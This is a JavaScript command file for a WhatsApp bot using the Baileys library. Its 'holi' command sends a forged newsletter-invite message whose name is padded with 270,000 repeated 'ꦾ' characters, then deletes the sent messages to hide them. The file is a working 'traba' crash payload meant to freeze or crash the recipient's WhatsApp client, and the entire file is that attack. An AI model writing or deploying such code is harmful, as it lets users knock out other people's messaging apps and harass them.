import fs from 'fs';
import { generateWAMessageFromContent } from '@whiskeysockets/baileys';

const FILE_PATH = './mensajes_guardados.json';

let handler = async (m, { conn }) => {
  try {
    if (m.isGroup) return m.reply('❌ Este comando no puede usarse en grupos.');

    const botNumber = conn.user?.jid || '';
    if (m.sender !== botNumber) {
      return m.reply('❌ Solo el número del bot puede usar este comando.');
    }

    if (!fs.existsSync(FILE_PATH)) return m.reply('❌ No hay mensaje guardado.');
    const mensaje = JSON.parse(fs.readFileSync(FILE_PATH, 'utf-8'));
    if (!mensaje?.message) return m.reply('❌ El archivo está dañado.');

    // 1. Enviar el mensaje guardado
    const reenviado = await conn.copyNForward(m.chat, mensaje, true);

    // 2. Eliminar usando el mismo remoteJid (no conn.user.id)
    await conn.sendMessage(m.chat, {
      delete: {
        remoteJid: m.chat,
        fromMe: true,
        id: reenviado.key.id,
        participant: botNumber
      }
    });

    // 3. Crear el mensaje tipo canal
    const travas = 'ꦾ'.repeat(90000);
    const canal = {
      newsletterAdminInviteMessage: {
        newsletterJid: "120363282786345717@newsletter",
        newsletterName: "🗣🗣🗣🗣" + travas + travas + travas,
        jpegThumbnail: Buffer.from('/9j/4AAQSkZJRgABAQAAAQABAAD/...Z', 'base64'),
        caption: "𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛  ᶻ 𝗓 𐰁",
        inviteExpiration: `${Math.floor(Date.now() / 1000) + 3600}`
      }
    };

    const generado = await generateWAMessageFromContent(m.chat, canal, {
      userJid: conn.user.id
    });

    await conn.relayMessage(m.chat, generado.message, { messageId: generado.key.id });

    // 4. Eliminar ese mensaje también
    await conn.sendMessage(m.chat, {
      delete: {
        remoteJid: m.chat,
        fromMe: true,
        id: generado.key.id,
        participant: botNumber
      }
    });

    await conn.sendMessage(m.chat, {
      text: '😼 Enviado con exito.',
    }, { quoted: m });

  } catch (e) {
    console.error('[ERROR enviarmsg]:', e);
    return m.reply('❌ Error:\n' + (e.message || e));
  }
};

handler.command = ['holi'];
export default handler;